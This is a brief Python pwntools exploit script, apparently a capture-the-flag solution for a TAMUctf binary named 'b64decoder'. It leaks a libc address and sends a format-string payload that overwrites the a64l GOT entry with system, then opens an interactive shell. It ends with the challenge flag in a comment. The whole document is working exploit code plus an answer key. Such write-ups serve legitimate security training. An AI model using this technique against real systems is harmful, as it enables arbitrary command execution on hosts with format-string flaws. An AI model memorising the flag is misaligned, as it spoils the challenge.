from pwn import *
elf = ELF('./b64decoder', checksec=False)
libc = ELF('/usr/lib32/libc.so.6', checksec=False)
#libc = ELF('libc.so.6', checksec=False)

p = elf.process()
#p = remote('challenges.tamuctf.com', 2783)

# leak parse
libc.address =  eval(p.recvline_contains('a64l')[-11:-1]) - libc.sym['a64l']

log.info('libc base     : 0x%x'%libc.address)
log.info('a64l addr     : 0x%x'%libc.sym['a64l'])
log.info('system addr   : 0x%x'%libc.sym['system'])

addr_1 = eval('0x' + hex(libc.sym['system'])[-4:])
payload = ''.join([
    p32(elf.got['a64l']+0),
    '%{:d}x'.format(addr_1 - 0x4),'%71$hn',
])

p.sendlineafter('name!', payload)
p.recvlines(2)  # clean buffer
p.interactive()
# gigem{b1n5h_1n_b45364?}